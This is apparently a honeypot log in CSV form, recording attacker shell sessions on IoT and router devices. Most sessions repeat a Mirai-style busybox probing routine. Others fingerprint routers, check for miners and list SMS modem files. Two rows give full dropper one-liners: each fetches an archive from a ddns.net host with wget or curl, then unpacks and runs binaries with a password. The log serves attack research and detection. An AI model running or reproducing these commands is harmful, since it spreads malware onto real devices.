,session,duration,command_freq,input
0,5cdead6ae593,3.456379652023315,2,uname -a
1,5cdead6ae593,3.456379652023315,2,cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget oakro.ddns.net/ssh || curl -o ssh oakro.ddns.net/ssh; tar xvf ssh; cd .ssh; chmod +x *; ./sshd; ./krane 1qaz@WSX
2,329191b151b8,10.134948492050173,13,enable
3,329191b151b8,10.134948492050173,13,system
4,329191b151b8,10.134948492050173,13,system
5,329191b151b8,10.134948492050173,13,shell
6,329191b151b8,10.134948492050173,13,shell
7,329191b151b8,10.134948492050173,13,sh
8,329191b151b8,10.134948492050173,13,cat /proc/mounts; /bin/busybox ZLMBN
9,329191b151b8,10.134948492050173,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox ZLMBN
10,329191b151b8,10.134948492050173,13,tftp; wget; /bin/busybox ZLMBN
11,329191b151b8,10.134948492050173,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
12,329191b151b8,10.134948492050173,13,while read i
13,329191b151b8,10.134948492050173,13,/bin/busybox ZLMBN
14,329191b151b8,10.134948492050173,13,rm .s; exit
15,d4769f89c00b,1.182728290557861,1,uname -s -v -n -r -m
16,d8223e6f5bc4,3.211135625839233,13,enable
17,d8223e6f5bc4,3.211135625839233,13,system
18,d8223e6f5bc4,3.211135625839233,13,system
19,d8223e6f5bc4,3.211135625839233,13,shell
20,d8223e6f5bc4,3.211135625839233,13,shell
21,d8223e6f5bc4,3.211135625839233,13,sh
22,d8223e6f5bc4,3.211135625839233,13,cat /proc/mounts; /bin/busybox ELJWS
23,d8223e6f5bc4,3.211135625839233,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox ELJWS
24,d8223e6f5bc4,3.211135625839233,13,tftp; wget; /bin/busybox ELJWS
25,d8223e6f5bc4,3.211135625839233,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
26,d8223e6f5bc4,3.211135625839233,13,while read i
27,d8223e6f5bc4,3.211135625839233,13,/bin/busybox ELJWS
28,d8223e6f5bc4,3.211135625839233,13,rm .s; exit
29,8d3019ae1a5a,0.813608407974243,13,enable
30,8d3019ae1a5a,0.813608407974243,13,system
31,8d3019ae1a5a,0.813608407974243,13,system
32,8d3019ae1a5a,0.813608407974243,13,shell
33,8d3019ae1a5a,0.813608407974243,13,shell
34,8d3019ae1a5a,0.813608407974243,13,sh
35,8d3019ae1a5a,0.813608407974243,13,cat /proc/mounts; /bin/busybox RJWCK
36,8d3019ae1a5a,0.813608407974243,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox RJWCK
37,8d3019ae1a5a,0.813608407974243,13,tftp; wget; /bin/busybox RJWCK
38,8d3019ae1a5a,0.813608407974243,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
39,8d3019ae1a5a,0.813608407974243,13,while read i
40,8d3019ae1a5a,0.813608407974243,13,/bin/busybox RJWCK
41,8d3019ae1a5a,0.813608407974243,13,rm .s; exit
42,c67329299b6d,1.04880404472351,13,enable
43,c67329299b6d,1.04880404472351,13,system
44,c67329299b6d,1.04880404472351,13,system
45,c67329299b6d,1.04880404472351,13,shell
46,c67329299b6d,1.04880404472351,13,shell
47,c67329299b6d,1.04880404472351,13,sh
48,c67329299b6d,1.04880404472351,13,cat /proc/mounts; /bin/busybox UOXTH
49,c67329299b6d,1.04880404472351,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox UOXTH
50,c67329299b6d,1.04880404472351,13,tftp; wget; /bin/busybox UOXTH
51,c67329299b6d,1.04880404472351,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
52,c67329299b6d,1.04880404472351,13,while read i
53,c67329299b6d,1.04880404472351,13,/bin/busybox UOXTH
54,c67329299b6d,1.04880404472351,13,rm .s; exit
55,abac76d64b7f,12.954164028167725,2,uname -a
56,abac76d64b7f,12.954164028167725,2,cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hapto.ddns.net/ssh || curl -o ssh hapto.ddns.net/ssh; tar xvf ssh; cd .ssh; chmod +x *; ./sshd; ./krane root
57,ee45c24367eb,117.75325894355774,9,/ip cloud print
58,ee45c24367eb,117.75325894355774,9,/ip cloud print
59,ee45c24367eb,117.75325894355774,9,ifconfig
60,ee45c24367eb,117.75325894355774,9,uname -a
61,ee45c24367eb,117.75325894355774,9,cat /proc/cpuinfo
62,ee45c24367eb,117.75325894355774,9,ps | grep '[Mm]iner'
63,ee45c24367eb,117.75325894355774,9,ps -ef | grep '[Mm]iner'
64,ee45c24367eb,117.75325894355774,9,ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
65,ee45c24367eb,117.75325894355774,9,echo Hi | cat -n
66,a1fcd3e7e5f6,11.905640602111816,11,enable
67,a1fcd3e7e5f6,11.905640602111816,11,system
68,a1fcd3e7e5f6,11.905640602111816,11,system
69,a1fcd3e7e5f6,11.905640602111816,11,shell
70,a1fcd3e7e5f6,11.905640602111816,11,shell
71,a1fcd3e7e5f6,11.905640602111816,11,sh
72,a1fcd3e7e5f6,11.905640602111816,11,/bin/busybox SATORI
73,a1fcd3e7e5f6,11.905640602111816,11,/bin/busybox cat /bin/busybox || while read i; do /bin/busybox echo ; done < /bin/busybox || /bin/busybox dd if=/bin/busybox bs=22 count=1
74,a1fcd3e7e5f6,11.905640602111816,11,cat /bin/busybox
75,a1fcd3e7e5f6,11.905640602111816,11,while read i
76,a1fcd3e7e5f6,11.905640602111816,11,dd if=/bin/busybox bs=22 count=1
77,d51e460c7b30,4.036076784133911,13,enable
78,d51e460c7b30,4.036076784133911,13,system
79,d51e460c7b30,4.036076784133911,13,system
80,d51e460c7b30,4.036076784133911,13,shell
81,d51e460c7b30,4.036076784133911,13,shell
82,d51e460c7b30,4.036076784133911,13,sh
83,d51e460c7b30,4.036076784133911,13,cat /proc/mounts; /bin/busybox UNEIU
84,d51e460c7b30,4.036076784133911,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox UNEIU
85,d51e460c7b30,4.036076784133911,13,tftp; wget; /bin/busybox UNEIU
86,d51e460c7b30,4.036076784133911,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
87,d51e460c7b30,4.036076784133911,13,while read i
88,d51e460c7b30,4.036076784133911,13,/bin/busybox UNEIU
89,d51e460c7b30,4.036076784133911,13,rm .s; exit
90,78567d68a8f3,5.159321069717407,13,enable
91,78567d68a8f3,5.159321069717407,13,system
92,78567d68a8f3,5.159321069717407,13,system
93,78567d68a8f3,5.159321069717407,13,shell
94,78567d68a8f3,5.159321069717407,13,shell
95,78567d68a8f3,5.159321069717407,13,sh
96,78567d68a8f3,5.159321069717407,13,cat /proc/mounts; /bin/busybox XROPL
97,78567d68a8f3,5.159321069717407,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox XROPL
98,78567d68a8f3,5.159321069717407,13,tftp; wget; /bin/busybox XROPL
99,78567d68a8f3,5.159321069717407,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
100,78567d68a8f3,5.159321069717407,13,while read i
101,78567d68a8f3,5.159321069717407,13,/bin/busybox XROPL
102,78567d68a8f3,5.159321069717407,13,rm .s; exit
103,a1708c7efde1,5.594111204147339,1,nproc; uname -a
104,a30230328068,2.943906784057617,13,enable
105,a30230328068,2.943906784057617,13,system
106,a30230328068,2.943906784057617,13,system
107,a30230328068,2.943906784057617,13,shell
108,a30230328068,2.943906784057617,13,shell
109,a30230328068,2.943906784057617,13,sh
110,a30230328068,2.943906784057617,13,cat /proc/mounts; /bin/busybox DYQVX
111,a30230328068,2.943906784057617,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox DYQVX
112,a30230328068,2.943906784057617,13,tftp; wget; /bin/busybox DYQVX
113,a30230328068,2.943906784057617,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
114,a30230328068,2.943906784057617,13,while read i
115,a30230328068,2.943906784057617,13,/bin/busybox DYQVX
116,a30230328068,2.943906784057617,13,rm .s; exit
117,e77109ef96fd,2.777678489685058,13,enable
118,e77109ef96fd,2.777678489685058,13,system
119,e77109ef96fd,2.777678489685058,13,system
120,e77109ef96fd,2.777678489685058,13,shell
121,e77109ef96fd,2.777678489685058,13,shell
122,e77109ef96fd,2.777678489685058,13,sh
123,e77109ef96fd,2.777678489685058,13,cat /proc/mounts; /bin/busybox KIHZA
124,e77109ef96fd,2.777678489685058,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox KIHZA
125,e77109ef96fd,2.777678489685058,13,tftp; wget; /bin/busybox KIHZA
126,e77109ef96fd,2.777678489685058,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
127,e77109ef96fd,2.777678489685058,13,while read i
128,e77109ef96fd,2.777678489685058,13,/bin/busybox KIHZA
129,e77109ef96fd,2.777678489685058,13,rm .s; exit
130,d3ece9366a18,9.004159927368164,13,enable
131,d3ece9366a18,9.004159927368164,13,system
132,d3ece9366a18,9.004159927368164,13,system
133,d3ece9366a18,9.004159927368164,13,shell
134,d3ece9366a18,9.004159927368164,13,shell
135,d3ece9366a18,9.004159927368164,13,sh
136,d3ece9366a18,9.004159927368164,13,cat /proc/mounts; /bin/busybox JOKGF
137,d3ece9366a18,9.004159927368164,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox JOKGF
138,d3ece9366a18,9.004159927368164,13,tftp; wget; /bin/busybox JOKGF
139,d3ece9366a18,9.004159927368164,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
140,d3ece9366a18,9.004159927368164,13,while read i
141,d3ece9366a18,9.004159927368164,13,/bin/busybox JOKGF
142,d3ece9366a18,9.004159927368164,13,rm .s; exit
143,0540a14cc9ef,4.336338520050049,13,enable
144,0540a14cc9ef,4.336338520050049,13,system
145,0540a14cc9ef,4.336338520050049,13,system
146,0540a14cc9ef,4.336338520050049,13,shell
147,0540a14cc9ef,4.336338520050049,13,shell
148,0540a14cc9ef,4.336338520050049,13,sh
149,0540a14cc9ef,4.336338520050049,13,cat /proc/mounts; /bin/busybox JKDOP
150,0540a14cc9ef,4.336338520050049,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox JKDOP
151,0540a14cc9ef,4.336338520050049,13,tftp; wget; /bin/busybox JKDOP
152,0540a14cc9ef,4.336338520050049,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
153,0540a14cc9ef,4.336338520050049,13,while read i
154,0540a14cc9ef,4.336338520050049,13,/bin/busybox JKDOP
155,0540a14cc9ef,4.336338520050049,13,rm .s; exit
156,239f93542791,18.20142102241516,13,enable
157,239f93542791,18.20142102241516,13,system
158,239f93542791,18.20142102241516,13,system
159,239f93542791,18.20142102241516,13,shell
160,239f93542791,18.20142102241516,13,shell
161,239f93542791,18.20142102241516,13,sh
162,239f93542791,18.20142102241516,13,cat /proc/mounts; /bin/busybox IWMTP
163,239f93542791,18.20142102241516,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox IWMTP
164,239f93542791,18.20142102241516,13,tftp; wget; /bin/busybox IWMTP
165,239f93542791,18.20142102241516,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
166,239f93542791,18.20142102241516,13,while read i
167,239f93542791,18.20142102241516,13,/bin/busybox IWMTP
168,239f93542791,18.20142102241516,13,rm .s; exit
169,c226f05f05d8,112.84874820709229,9,/ip cloud print
170,c226f05f05d8,112.84874820709229,9,/ip cloud print
171,c226f05f05d8,112.84874820709229,9,ifconfig
172,c226f05f05d8,112.84874820709229,9,uname -a
173,c226f05f05d8,112.84874820709229,9,cat /proc/cpuinfo
174,c226f05f05d8,112.84874820709229,9,ps | grep '[Mm]iner'
175,c226f05f05d8,112.84874820709229,9,ps -ef | grep '[Mm]iner'
176,c226f05f05d8,112.84874820709229,9,ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
177,c226f05f05d8,112.84874820709229,9,echo Hi | cat -n
178,1b1db78aec94,1.274125814437866,13,enable
179,1b1db78aec94,1.274125814437866,13,system
180,1b1db78aec94,1.274125814437866,13,system
181,1b1db78aec94,1.274125814437866,13,shell
182,1b1db78aec94,1.274125814437866,13,shell
183,1b1db78aec94,1.274125814437866,13,sh
184,1b1db78aec94,1.274125814437866,13,cat /proc/mounts; /bin/busybox GMNWA
185,1b1db78aec94,1.274125814437866,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox GMNWA
186,1b1db78aec94,1.274125814437866,13,tftp; wget; /bin/busybox GMNWA
187,1b1db78aec94,1.274125814437866,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
188,1b1db78aec94,1.274125814437866,13,while read i
189,1b1db78aec94,1.274125814437866,13,/bin/busybox GMNWA
190,1b1db78aec94,1.274125814437866,13,rm .s; exit
191,d77ffde64c08,4.022591114044189,13,enable
192,d77ffde64c08,4.022591114044189,13,system
193,d77ffde64c08,4.022591114044189,13,system
194,d77ffde64c08,4.022591114044189,13,shell
195,d77ffde64c08,4.022591114044189,13,shell
196,d77ffde64c08,4.022591114044189,13,sh
197,d77ffde64c08,4.022591114044189,13,cat /proc/mounts; /bin/busybox PCSHC
198,d77ffde64c08,4.022591114044189,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox PCSHC
199,d77ffde64c08,4.022591114044189,13,tftp; wget; /bin/busybox PCSHC
200,d77ffde64c08,4.022591114044189,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
201,d77ffde64c08,4.022591114044189,13,while read i
202,d77ffde64c08,4.022591114044189,13,/bin/busybox PCSHC
